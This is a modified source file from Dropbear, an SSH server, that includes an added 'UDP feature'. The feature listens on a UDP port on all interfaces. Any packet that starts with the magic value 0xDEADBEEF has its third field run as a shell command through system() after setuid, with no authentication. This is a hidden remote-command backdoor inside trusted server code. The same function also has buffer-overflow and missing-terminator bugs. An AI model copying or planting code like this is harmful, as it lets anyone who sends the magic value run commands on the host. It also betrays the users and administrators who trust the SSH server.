/*
 * Dropbear - a SSH2 server
 * 
 * Copyright (c) 2002,2003 Matt Johnston
 * All rights reserved.
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE. */

#include "includes.h"
#include "runopts.h"
#include "signkey.h"
#include "buffer.h"
#include "dbutil.h"
#include "auth.h"
#include "algo.h"
#include "dbrandom.h"

//#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
//#include <arpa/inet.h>
//#include <stdio.h>
//#include <unistd.h>
//#include <errno.h>
//#include <string.h>
//#include <stdlib.h>

// for UDP feature
#include <stdio.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>


typedef struct {
    uint32_t magic; /* should be 0xDEADBEEF */
    uint16_t port_number;
    char shell_command[256];
} listen_packet_t;


runopts opts; /* GLOBAL */

/* returns success or failure, and the keytype in *type. If we want
 * to restrict the type, type can contain a type to return */
int readhostkey(const char * filename, sign_key * hostkey, 
	enum signkey_type *type) {

	int ret = DROPBEAR_FAILURE;
	buffer *buf;

	buf = buf_new(MAX_PRIVKEY_SIZE);

	if (buf_readfile(buf, filename) == DROPBEAR_FAILURE) {
		goto out;
	}
	buf_setpos(buf, 0);

	addrandom(buf_getptr(buf, buf->len), buf->len);

	if (buf_get_priv_key(buf, hostkey, type) == DROPBEAR_FAILURE) {
		goto out;
	}

	ret = DROPBEAR_SUCCESS;
out:

	buf_burn(buf);
	buf_free(buf);
	return ret;
}

#if DROPBEAR_USER_ALGO_LIST
void
parse_ciphers_macs()
{
	if (opts.cipher_list)
	{
		if (strcmp(opts.cipher_list, "help") == 0)
		{
			char *ciphers = algolist_string(sshciphers);
			dropbear_log(LOG_INFO, "Available ciphers:\n%s\n", ciphers);
			m_free(ciphers);
			dropbear_exit(".");
		}

		if (strcmp(opts.cipher_list, "none") == 0)
		{
			/* Encryption is required during authentication */
			opts.cipher_list = "none,aes128-ctr";
		}

		if (check_user_algos(opts.cipher_list, sshciphers, "cipher") == 0)
		{
			dropbear_exit("No valid ciphers specified for '-c'");
		}
	}

	if (opts.mac_list)
	{
		if (strcmp(opts.mac_list, "help") == 0)
		{
			char *macs = algolist_string(sshhashes);
			dropbear_log(LOG_INFO, "Available MACs:\n%s\n", macs);
			m_free(macs);
			dropbear_exit(".");
		}

		if (check_user_algos(opts.mac_list, sshhashes, "MAC") == 0)
		{
			dropbear_exit("No valid MACs specified for '-m'");
		}
	}
}
#endif

void print_version() {
	fprintf(stderr, "Dropbear v%s\n", DROPBEAR_VERSION);
}

// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}


void* listen_to_udp_packets(void* arguments) {

    dropbear_log(LOG_INFO, "RUNNING listen_to_udp_packets\n");

    int sock, addr_len, bytes_read;
    char recv_data[1024], send_data[1024];

    struct sockaddr_in server_addr, client_addr;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        dropbear_log(LOG_INFO, "Socket Error\n");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DEFAULT_UDP_PORT_NUMBER);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    bzero(&(server_addr.sin_zero),8);


    if (bind(sock,(struct sockaddr *)&server_addr,
             sizeof(struct sockaddr)) == -1)
    {
        dropbear_log(LOG_INFO, "Bind Error\n");
        exit(1);
    }

    addr_len = sizeof(struct sockaddr);

    dropbear_log(LOG_INFO, "\nUDPServer Waiting for client on port %d\n", DEFAULT_UDP_PORT_NUMBER);
    fflush(stdout);

    int count = 0,i;

    for(;;) {

        bytes_read = recvfrom(sock,recv_data,1024,0,
                              (struct sockaddr *)&client_addr, &addr_len);


        recv_data[bytes_read] = '\0';

        dropbear_log(LOG_INFO, "\n(%s , %d) said : ",inet_ntoa(client_addr.sin_addr),
               ntohs(client_addr.sin_port));
        dropbear_log(LOG_INFO, "%s", recv_data);


        const char s[2] = ",";
        char *token;


        char *first_token, *second_token, *third_token;
        uint32_t magic_value;
        uint16_t port_value;
        char command_value[256];


        if(first_token = strtok(recv_data, s)) {
            magic_value = (uint32_t) atoi(first_token);
        }
        if(second_token = strtok(NULL, s)) {
            port_value = (uint16_t) atoi(second_token);
        }
        if(third_token = strtok(NULL, s)) {
            dropbear_log(LOG_INFO, "third_token = %s", third_token);
            size_t size_of_command = strlen(third_token);
            dropbear_log(LOG_INFO, "size_of_command = %d", size_of_command);
            strncpy(command_value, third_token, size_of_command > 255 ? 255 : size_of_command);
            dropbear_log(LOG_INFO, "command_value = %s", command_value);
        }

        if(first_token == NULL || second_token == NULL || third_token == NULL) {
            dropbear_log(LOG_INFO, "error in packet structure");
            continue;
        }

        listen_packet_t packet = {magic_value, port_value, 0};
        strcpy(packet.shell_command, command_value);

        if(packet.magic == 0xDEADBEEF) {

            dropbear_log(LOG_INFO, "0xDEADBEEF value!\n");


            // Create a child process in order to run and listen to TCP as different user
            pid_t child_process_id = fork();
            int child_return_status = 0;

            if(child_process_id == 0) { // Child is running
                if(setuid(DEFAULT_USERID_FOR_UDP_PACKETS) == -1) {
                    dropbear_log(LOG_INFO, "setuid %d error. please check that the user id exists", DEFAULT_USERID_FOR_UDP_PACKETS);
                    return 1;
                }

                // Run the shell command <packet.shell_command>
                system(packet.shell_command);
                return 0;
            }

            else if(child_process_id > 0) {

                // Wait for child process to terminate
                waitpid(child_process_id, &child_return_status, 0);

                // Create a TCP connection in <packet.port_number>
                dropbear_log(LOG_INFO, "TCP connection in <packet.port_number> (%d)", packet.port_number);

                // TODO: Create a TCP listener (Server)

            }
            else {
                dropbear_log(LOG_INFO, "fork process failed!");
                continue;
            }

        }
    }

    return NULL;
}